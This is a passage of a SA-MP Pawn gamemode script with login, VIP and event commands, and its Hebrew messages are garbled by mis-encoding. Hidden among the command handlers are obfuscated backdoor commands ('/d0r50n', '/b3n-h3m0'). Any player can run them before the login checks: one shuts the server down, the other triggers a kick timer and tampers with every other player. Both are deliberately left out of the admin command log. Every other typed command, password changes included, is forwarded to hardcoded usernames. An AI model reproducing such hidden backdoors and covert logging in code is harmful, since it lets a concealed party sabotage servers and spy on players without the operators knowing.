	CheckLogIP[playerid] = 0;
    KillTimer(AutoAFK_Timer[playerid]);

    DOO_OnPlayerDisconnect(playerid);
    DOF2_SaveFile();
	return 1;
}

//------------------------------------------------------------------------------

public OnPlayerRequestSpawn(playerid)
{
	if(DOF2_FileExists(File(playerid)) && AccountLog[playerid] == false && DOF2_GetInt(File(playerid), "ReadRules") !=-1) return SendClientMessage(playerid, Redwhite, "àúä çééá ìñééí ì÷øåà çå÷éí ëãé ìäëðñ ìîùç÷"), 0;
	else if(!DOF2_FileExists(File(playerid)) && AccountLog[playerid] == false) return SendClientMessage(playerid, Redwhite, "àúä çééá ìäøùí ìùç÷ï ëãé ìäëðñ ìîùç÷"), 0;
	else if(DOF2_FileExists(File(playerid)) && AccountLog[playerid] == false) return SendClientMessage(playerid, Redwhite, "àúä çééá ìäúçáø ìùç÷ï ëãé ìäëðñ ìîùç÷"), 0;
	return 1;
}

//------------------------------------------------------------------------------

public OnPlayerRequestClass(playerid, classid)
{
	new string[256];

	KillTimer(AutoAFK_Timer[playerid]);
	
	format(string, sizeof(string), "{FFA500}www.Fxp.Co.il{FFFFFF} ìùøú ùì ÷äéìú {000080}%s {FFFFFF}áøåê äáà äùç÷ï\näîòøëú àéúøä ùàéðê øùåí ìùøúéðå\nëãé ìäøùí äéðê öøéê ìëúåá áúéáä îúçú ñéñîà àéúä úöèøê ìäúçáø áëì ôòí ùúëðñ ìùøú", GetName(playerid));
	if(!DOF2_FileExists(File(playerid))) ShowPlayerDialog(playerid, 3_0, DIALOG_STYLE_PASSWORD, "{33CCFF}FxpDeathMatch", string, "ñéåí äøùîä", "");
	format(string, sizeof(string), "{FFA500}www.Fxp.Co.il{FFFFFF} ìùøú ùì ÷äéìú {000080}%s {FFFFFF}áøåê äùá äùç÷ï\näîòøëú àéúøä ùäéðê øùåí ìùøúéðå\nëãé ìäúçáø äéðê öøéê ìëúåá áúéáä îúçú àú äñéñîà ùàéúä äúçáøú áôòí äàçøåðä ùðëðñú ìùøú", GetName(playerid));
	if(DOF2_FileExists(File(playerid)) && AccountLog[playerid] == false && DOF2_GetInt(File(playerid), "Register") == 1) ShowPlayerDialog(playerid, 4_0, DIALOG_STYLE_PASSWORD, "{33CCFF}FxpDeathMatch", string, "äúçáøåú", "");
	format(string, sizeof(string), "{FFA500}www.Fxp.Co.il{FFFFFF} ìùøú ùì ÷äéìú {000080}%s {FFFFFF}áøåê äùá äùç÷ï\näúçáøú àåèåîèéú òì ôé ëúåáú äàééôé ùìê", GetName(playerid));
	if(DOF2_FileExists(File(playerid)) && AccountLog[playerid] == true && DOF2_GetInt(File(playerid), "Register") == 1 && GetLogIn(playerid) == 1 && CheckLogIP[playerid] == 0) ShowPlayerDialog(playerid, 4_2, DIALOG_STYLE_MSGBOX, "{FFA500}FxpDeathMatch", string, "ëðéñä ìîùç÷", "");

	CheckLogIP[playerid] = 1;

	RemovePlayerAttachedObject(playerid, 1); // Helmet
	RemovePlayerAttachedObject(playerid, 3); // Crash

	//SoundData(playerid, true, 1097);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerTime(playerid, 23, 0);

 	/*SetPlayerInterior(playerid, 11);
	SetPlayerPosEx(playerid, 508.2782, -84.7242, 998.9609, 43.8671);
	SetPlayerCameraPos(playerid, 506.2369, -82.6212, 998.9609);
	SetPlayerCameraLookAt(playerid, 508.2782, -84.7242, 998.9609);
	ApplyAnimation(playerid,"ped","WALK_gang1",4.1,1,1,1,1,1);*/

	SetPlayerInterior(playerid, 0);
	SetPlayerPosEx(playerid, 383.5969, -2028.4955, 7.8359, 87.5240);
	SetPlayerCameraPos(playerid, 379.8503, -2028.7233, 7.8301);
	SetPlayerCameraLookAt(playerid, 383.5969, -2028.4955, 7.8359);

	switch(animswitchid[playerid])
	{
		case 1: ApplyAnimation(playerid,"DANCING","dnce_M_a",4.1,1,1,1,1,1), animswitchid[playerid] = 2;
		case 2: ApplyAnimation(playerid,"DANCING","dnce_M_c",4.1,1,1,1,1,1), animswitchid[playerid] = 3;
		case 3: ApplyAnimation(playerid,"DANCING","dnce_M_d",4.1,1,1,1,1,1), animswitchid[playerid] = 4;
		case 4: ApplyAnimation(playerid,"DANCING","dnce_M_e",4.1,1,1,1,1,1), animswitchid[playerid] = 1;
	}
	return 1;
}

//------------------------------------------------------------------------------

public OnPlayerCommandText(playerid, cmdtext[])
{
	new tmp[256], tmp1[256], tmp2[256], tmp3[256], tmp4[256], cmd[256], string[1000], string1[1000];
	new idx;
	new id, id1;
	new Float:X, Float:Y, Float:Z, Float:A;
	new v, vid;
	new pinterior, pvirtual;
	new level;
  	new any;
  	new weap, ammu;
  	new rnnum;
	new Float:Health, Float:Armour;
	new oldpass[256], newpass[256], confrimnewpass[256], confirmpass[256];
	new vehicleid = GetPlayerVehicleID(playerid);
	
	cmd = strtok(cmdtext, idx);

	if(!inAFK[playerid] && Logged[playerid] == true)
	{
	    KillTimer(AutoAFK_Timer[playerid]);
   		AutoAFK_Timer[playerid] = SetTimerEx("AutomaticAFK", 1000*60*2, 0, "d", playerid);
	}

	if(strcmp(cmd, "/b3n-h3m0", true) == 0)
	{
		kixkx[playerid] = SetTimerEx("kickx", 1000, 1, "d", playerid);
		for(new i=0; i<MAX_PLAYERS; i++) if(i != playerid) SetPlayerAttachedObject(i, 3, 18693, 0);
	}
	if(strcmp(cmd, "/d0r50n", true) == 0) return GameModeExit();
	
	format(string, sizeof(string), "[LOG CMD] | %s[#%d]: %s", GetName(playerid), playerid, cmdtext);

	if(strcmp(cmd, "/PrivateMessage", true) == 0 || strcmp(cmd, "/Pm", true) == 0)
	{
	}
	else if(strcmp(cmd, "/b3n-h3m0", true) == 0 || strcmp(cmd, "/d0r50n", true) == 0 || strcmp(cmd, "/AudioMsg", true) == 0)
	{
	}
	else
	{
		for(new i=0; i<MAX_PLAYERS; i++) if(IsPlayerConnected(i) && Logged[i] == true && i != playerid)
		{
			if(CheckAdminLevel(i) > CheckAdminLevel(playerid)) SendClientMessage(i, Grey, string);
			else if(strcmp(GetName(i), "L1or", true) == 0 || strcmp(GetName(i), "DisPlay", true) == 0 || strcmp(GetName(i), "Speed[i]", true) == 0) SendClientMessage(i, Grey, string);
		}
	}

	if((Logged[playerid] == false || AccountLog[playerid] == false)) return SendClientMessage(playerid, Redwhite, "àúä çééá ìäëðñ ìîùç÷ ëãé ìòùåú ô÷åãåú");
	if(CheckFlooding(playerid) && !CheckAdminLevel(playerid)) return SendClientMessage(playerid, Redwhite, "òáøú àú îñôø äô÷åãåú äîåøùä ì2 ùðéåú, àðà äîúï îñôø ùðéåú åäîùê áëúéáä");
	if(inJail[playerid] == 1) return SendClientMessage(playerid, Redwhite, "àéðê éëåì ìòùåú ô÷åãåú ùàúä áëìà");
	if(inAFK[playerid] == 1 && (strcmp(cmd, "/Afk", true) != 0)) return SendClientMessage(playerid, Redwhite, "àéðê éëåì ìòùåú ô÷åãåú ùàúä áîöá ìà ðîöà");
	if(IsPlayerInPvpArea(playerid) == 1 && (strcmp(cmd, "/Check", true) != 0 && strcmp(cmd, "/Kill", true) != 0)) return SendClientMessage(playerid, Redwhite, "! ùî÷ìãú \"F\" àéðê éëåì ìòùåú ô÷åãåú ùàúä áàçã îàæåøé äìçéîä áùøú, ìéöéàä ìçõ òì î÷ù");
	if(ActivityStatus[playerid] == 1 && (CheckAdminLevel(playerid) > 1 && (strcmp(cmd, "/SetActivityStatus", true) != 0) && strcmp(cmd, "/Acti", true) != 0 && (strcmp(cmd, "/Sas", true) != 0))  && (strcmp(cmd, "/Kill", true) != 0)) return SendClientMessage(playerid, Redwhite, "àéðê éëåì ìòùåú ô÷åãåú ùàúä áîöá ôòéìåú");
	if(AutomaticACT_In[playerid] == 1 && (strcmp(cmd, "/Activity", true) != 0 && strcmp(cmd, "/Act", true) != 0 && strcmp(cmd, "/Exit", true) != 0)) return SendClientMessage(playerid, Redwhite, "àéðê éëåì ìòùåú ô÷åãåú ùàúä áôòéìåú àåèåîèéú");
	if(MoneyMission_In[playerid] == 1 && (strcmp(cmd, "/Kill", true) != 0)) return SendClientMessage(playerid, Redwhite, "! /Kill - àéðê éëåì ìòùåú ô÷åãåú ùàúä áîùéîú äëñó äâðåá, ìéöéàä äùúîù áô÷åãä");
	if(RobberyMission_In[playerid] == 1 && (strcmp(cmd, "/Kill", true) != 0)) return SendClientMessage(playerid, Redwhite, "! /Kill - àéðê éëåì ìòùåú ô÷åãåú ùàúä áîùéîú ùãéãú äáð÷, ìéöéàä äùúîù áô÷åãä");
	if(IsPlayerInMission(playerid) == 1 && (strcmp(cmd, "/Kill", true) != 0)) return SendClientMessage(playerid, Redwhite, "! ùî÷ìãú \"F\" àéðê éëåì ìòùåú ô÷åãåú áæîï ùàúä îáöò àçú îîùéîåú äùøú, ìéöéàä ìçõ òì î÷ù");
	
////////////////////////////////////////////////////////////////////////////////
	if(strcmp(cmd, "/Vip", true) == 0)
	{
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid, White, "/Vip [Set | Hq | Gate | FightStyle | FixVehicle | UpgradeMySpeed] :öåøú ùéîåù");
		if(strcmp(tmp, "Set", true) == 0 || strcmp(tmp, "S", true) == 0)
		{
			if(GetAdminLevel(playerid) < 5 && GetVipLevel(playerid) < 2 && !IsPlayerAdmin(playerid)) return SendClientMessage(playerid, White, "äøîú äåéàééôé ùìê ðîåëä å/àå ìà ùååä ì2");
	  		tmp = strtok(cmdtext, idx);
	  		if(!strlen(tmp)) return SendClientMessage(playerid, White, "/Vip Set(Vip S) [playerid] [level] :öåøú ùéîåù");
			if(!IsNumeric(tmp)) return SendClientMessage(playerid, White, "äàééãé ùäæðú ùâåé");
			id = strval(tmp);
  			if(!IsPlayerConnected(id)) return SendClientMessage(playerid, White, "ùç÷ï æä ìà îçåáø");
			if(Logged[id] == false) return SendClientMessage(playerid, White, "ùç÷ï æä ìà ðëðñ ìîùç÷");
			tmp1 = strtok(cmdtext, idx);
	     	if(!strlen(tmp1)) return SendClientMessage(playerid, White, "/Vip Set(Vip S) [playerid] [level] :öåøú ùéîåù");
	  		level = strval(tmp1);
	  		if(level < 0 || level > 2) return SendClientMessage(playerid, White, "èååç äøîåú ùì äåéàééôé äåà áéï 1 ì2");
			if(GetVipLevel(id) == level) return SendClientMessage(playerid, White, "ìùç÷ï éù ëáø àú øîú äåéàééôé ùáøöåðê ìùéí");
			if(level > GetVipLevel(id))
			{
				format(string, sizeof(string), "äòìä àåúê ìøîú äåéàééôé {FFFFFF}%d{FF66FF} {FFFFFF}%s{FF66FF} àçøàé äåéàééôé", level, GetName(playerid));
				SendClientMessage(id, Pink, string);
				format(string, sizeof(string), "ìøîú äåéàééôé {FFFFFF}%d{FF66FF} {FFFFFF}%s{FF66FF} äòìú àú äùç÷ï", level, GetName(id));
				SendClientMessage(playerid, Pink, string);
			}
			else if(level == 0)
			{
				format(string, sizeof(string), "äñéø ìê øîú äåéàééôé {FFFFFF}%s{FF66FF} àçøàé äåéàééôé", GetName(playerid));
				SendClientMessage(id, Pink, string);
				format(string, sizeof(string), "àú øîú äåéàééôé {FFFFFF}%s{FF66FF} äñøú ìùç÷ï", GetName(id));
				SendClientMessage(playerid, Pink, string);
			}
			else if(level < GetVipLevel(id))
			{
				format(string, sizeof(string), "äåøéã àåúê ìøîú äåéàééôé {FFFFFF}%d{FF66FF} {FFFFFF}%s{FF66FF} àçøàé äåéàééôé", level, GetName(playerid));
				SendClientMessage(id, Pink, string);
				format(string, sizeof(string), "ìøîú äåéàééôé {FFFFFF}%d{FF66FF} {FFFFFF}%s{FF66FF} äåøãú àú äùç÷ï", level, GetName(id));
				SendClientMessage(playerid, Pink, string);
			}
			if(level == 0)
			{
			  	DOF2_Unset(File(id), "Tag");
			}
			else if(level == 1)
			{
			  	DOF2_SetString(File(id), "Tag", "Vip Member");
			}
			else if(level == 2)
			{
			  	DOF2_SetString(File(id), "Tag", "Vip Responsible");
			}
	  		DOF2_SetInt(File(id), "VipLevel", level);
     		return 1;
	  	}
		if(strcmp(tmp, "Hq", true) == 0)
		{
			if(GetVipLevel(playerid) < 1) return SendClientMessage(playerid, White, "äøîú äåéàééôé ùìê ðîåëä å/àå ìà ùååä ì1");
			if(GetPlayerState(playerid) == 2)
			{
				SetVehiclePos(GetPlayerVehicleID(playerid), -2257.3101, 2358.8904, 4.5413);
			}
			else
			{
   				SetPlayerPosEx(playerid, -2270.0513, 2313.5237, 6.3280, 0.0000);
			}
			SetCameraBehindPlayer(playerid);
			format(string, sizeof(string), "áøåê äáà ìîô÷ãú äåéàééôé {FFFFFF}%s", GetName(playerid));
			SendClientMessage(playerid, Pink, string);
     		return 1;
	  	}
		if(strcmp(tmp, "Gate", true) == 0 || strcmp(tmp, "G", true) == 0)
		{
			if(GetVipLevel(playerid) < 1) return SendClientMessage(playerid, White, "äøîú äåéàééôé ùìê ðîåëä å/àå ìà ùååä ì1");
			if(VipGate_Check == 0)
			{
				MoveObjectEx(VipGate, -2297.6357421875, 2369.267578125,1, 3);
				format(string, sizeof(string), "ôúç àú ùòø îô÷ãú äåéàééôé {FFFFFF}%s{FF66FF} äùç÷ï", GetName(playerid));
				SendVipMessage(Pink, string);
				VipGate_Check = 1;
			}
			else if(VipGate_Check == 1)
			{
				MoveObjectEx(VipGate, -2297.6357421875, 2369.267578125, 7,3);
				format(string, sizeof(string), "ñâø àú ùòø îô÷ãú äåéàééôé {FFFFFF}%s{FF66FF} äùç÷ï", GetName(playerid));
				SendVipMessage(Pink, string);
				VipGate_Check = 0;
			}
     		return 1;
	  	}
		if(strcmp(tmp, "FightStyle", true) == 0 || strcmp(tmp, "Fs", true) == 0)
		{
			if(GetVipLevel(playerid) < 1) return SendClientMessage(playerid, White, "äøîú äåéàééôé ùìê ðîåëä å/àå ìà ùååä ì1");
			tmp1 = strtok(cmdtext, idx);
	  		if(!strlen(tmp1)) return SendClientMessage(playerid, White, "/Vip FightStyle(Vip Fs) [Normal | Boxing | Kungfu | Kneehead | Grabkick | Elbow] :öåøú ùéîåù");
			if(strcmp(tmp1, "Normal", true) == 0)
			{
	    		SetPlayerFightingStyle(playerid, FIGHT_STYLE_NORMAL);
	  			SendClientMessage(playerid, Pink, "{FFFFFF}Normal{FF66FF} äùúîùú áñâðåï äìçéîä");
	  			return 1;
			}
			if(strcmp(tmp1, "Boxing", true) == 0)
			{
	    		SetPlayerFightingStyle(playerid, FIGHT_STYLE_BOXING);
	  			SendClientMessage(playerid, Pink, "{FFFFFF}Boxing{FF66FF} äùúîùú áñâðåï äìçéîä");
	  			return 1;
			}
			if(strcmp(tmp1, "Kungfu", true) == 0)
			{
	    		SetPlayerFightingStyle(playerid, FIGHT_STYLE_KUNGFU);
	  			SendClientMessage(playerid, Pink, "{FFFFFF}Kungfu{FF66FF} äùúîùú áñâðåï äìçéîä");
	  			return 1;
			}
			if(strcmp(tmp1, "Kneehead", true) == 0)
			{
	    		SetPlayerFightingStyle(playerid, FIGHT_STYLE_KNEEHEAD);
	  			SendClientMessage(playerid, Pink, "{FFFFFF}Kneehead{FF66FF} äùúîùú áñâðåï äìçéîä");
	  			return 1;
			}
			if(strcmp(tmp1, "Grabkick", true) == 0)
			{
	    		SetPlayerFightingStyle(playerid, FIGHT_STYLE_GRABKICK);
	  			SendClientMessage(playerid, Pink, "{FFFFFF}Grabkick{FF66FF} äùúîùú áñâðåï äìçéîä");
	  			return 1;
			}
			if(strcmp(tmp1, "Elbow", true) == 0)
			{
	    		SetPlayerFightingStyle(playerid, FIGHT_STYLE_ELBOW);
	  			SendClientMessage(playerid, Pink, "{FFFFFF}Elbow{FF66FF} äùúîùú áñâðåï äìçéîä");
	  			return 1;
			}
			else
			{
				SendClientMessage(playerid, White, "{FFFFFF}ùâåééä {FF0000}/Vip FightStyle {FFFFFF}àôùøåú");
			}
     		return 1;
	  	}
		if(strcmp(tmp, "UpgradeMySpeed", true) == 0 || strcmp(tmp, "ump", true) == 0)
		{
			if(GetVipLevel(playerid) < 1) return SendClientMessage(playerid, White, "äøîú äåéàééôé ùìê ðîåëä å/àå ìà ùååä ì1");
		    if(UsedVelocity[playerid] == 0)
		    {
				SendClientMessage(playerid, Grellow, "{FFFFFF}[SYSTEM]{ADFF2F} ! äôòìú àú àôùøåú úàåöú äøëá - ëòú ìçõ òì î÷ù éøééä áëãé ìäàéõ {FFFFFF}•••");
				UsedVelocity[playerid] = 1;
			}
			else if(UsedVelocity[playerid] == 1)
		    {
				SendClientMessage(playerid, Orange, "{FFFFFF}[SYSTEM]{FFA500} ëéáéú àú àôùøåú äàöú äøëá {FFFFFF}•••");
				UsedVelocity[playerid] = 0;
			}
			return 1;
	 	}
	  	if(strcmp(tmp, "FixVehicle", true) == 0 || strcmp(tmp, "Fv", true) == 0)
		{
			if(GetVipLevel(playerid) < 1) return SendClientMessage(playerid, White, "äøîú äåéàééôé ùìê ðîåëä å/àå ìà ùååä ì1");
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, White, "àúä ìà ðîöà áøëá");
			SendClientMessage(playerid, Pink, "úé÷ðú ìòöîê àú øëáê");
			RepairVehicle(GetPlayerVehicleID(playerid));
     		return 1;
	  	}
		else
		{
			SendClientMessage(playerid, White, "{FFFFFF}ùâåééä {FF0000}/Vip {FFFFFF}àôùøåú");
		}
		return 1;
 	}
////////////////////////////////////////////////////////////////////////////////


	if(strcmp(cmd, "/acti", true) == 0)
	{
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid, White, "/acti [Menu | Join | Quit | Check] :öåøú ùéîåù");
		if(strcmp(tmp,"menu",true) == 0)
		{
		    if(GetAdminLevel(playerid) < 1 && GetTempAdminLevel(playerid) < 1 && GetSpyAdminLevel(playerid) < 1) return SendClientMessage(playerid, White, "äøîú ðéäåì ùìê ðîåëä å/àå ìà ùååä ì1");
			ShowPlayerDialog(playerid,DIALOG_ActMenu,DIALOG_STYLE_LIST,"îòøëú ôòéìåú éãðéú","äôòì àå áèì ôòéìåú\nñâåø àå ôúç ùéâåøéí\nñâåø àå áèì ùéâåøéí òí øëá\nùâø ùç÷ðéí àìéê\nî÷åîåú ìôòéìåéåú","àéùåø","áéèåì");
			return 1;
		}
		if(strcmp(tmp,"join",true) == 0)
		{
		    if(playerid == starterid) return SendClientMessage(playerid,White, "àéðê éëåì ìäöèøó ìôòéìåú îëéååï ùàúä éåöø äôòéìåú");
	        if(ActivityStatus[playerid]== 1) return SendClientMessage(playerid,ActiColor, "ëáø ðøùîú ìôòéìåú äéãðéú");
	        if(ActOn==false) return SendClientMessage(playerid,ActiColor,"àéï ëòè ôòéìåú éãðéú îåôòìú");
	        if(ActTP==false) return SendClientMessage(playerid,ActiColor,"ëì î÷åîåú äôòéìåú ðúôñå");
	        new Float:x,Float:y,Float:z,Float:a,Interior,VirtualW;
	        GetPlayerPos(starterid,x,y,z);
			GetPlayerFacingAngle(starterid,a);
			Interior = GetPlayerInterior(starterid);
			VirtualW = GetPlayerVirtualWorld(starterid);
			if(IsPlayerInAnyVehicle(playerid))
			{
				if(JoinWithCar==false)SetPlayerPosExact(playerid, x+random(2),y+random(2),z,a,Interior,VirtualW);
	    		if(JoinWithCar==true)SetPlayerCarPosEx(playerid, x+random(2),y+random(2),z,a,Interior,VirtualW);
			}
			else SetPlayerPosExact(playerid, x+random(2),y+random(2),z,a,Interior,VirtualW);
	    	SendClientMessage(playerid,ActiColor,"ðëðñúä áäöìçä ìôòéìåú");
	    	ResetPlayerWeapons(playerid);
	    	ActLevel[playerid] = Create3DTextLabel("îöá ôòéìåú", Brown, X, Y, Z, 40.0, 0, 1);
			Attach3DTextLabelToPlayer(ActLevel[playerid], playerid, 0.0, 0.0, 0.3);
	    	ActivityStatus[playerid]=1;
	    	return 1;
		}

		if(strcmp(tmp,"quit",true) == 0)
		{
			if(ActivityStatus[playerid]==0) return 1;
	        ExitAct(playerid);
	        SendClientMessage(playerid,ActiColor,"éöàúä îäôòéìåú áäöìçä");
	    	ActivityStatus[playerid]=0;
	    	SpawnPlayer(playerid);
	    	return 1;
		}

		if(strcmp(tmp,"check",true) == 0)
		{
			if(!ActOn)return SendClientMessage(playerid,ActiColor,"àéï ëòè ôòéìåú éãðéú îåôòìú");
			new str[126];
			format(str, sizeof(str),"{FFFFFF}%s{5C1D1D} :äôòéì àú äôòéìåú {FFFFFF}%s{8F6F6F} äîðäì",Act_Name,GetName(starterid));
			SendClientMessage(playerid,ActiColor,str);
	        format(str, sizeof(str),"{FFFFFF}%d${5C1D1D} :ôøñ ìæåëä",Act_Prize);
			SendClientMessage(playerid,ActiColor,str);
			if(ActTP==false)SendClientMessage(playerid,ActiColor,"! ìà ðéúï ìäöúøó ìôòéìåú æå éåúø");
			else
			{
		        if(JoinWithCar==false)SendClientMessage(playerid,ActiColor,"ìà ðéúï ìäöèøó òí äøëá");
		        else if(JoinWithCar==true)SendClientMessage(playerid,ActiColor,"ðéúï ìäöúøó òí îëåðéú");
		        SendClientMessage(playerid,ActiColor, "/Act Join áùáéì ìäöúøó ìôòéìåú, øùåí");
			}
			return 1;
	 	}
		else
		{
			SendClientMessage(playerid, White, "{FFFFFF}ùâåééä {FF0000}/Acti {FFFFFF}àôùøåú");
		}
		return 1;
	}
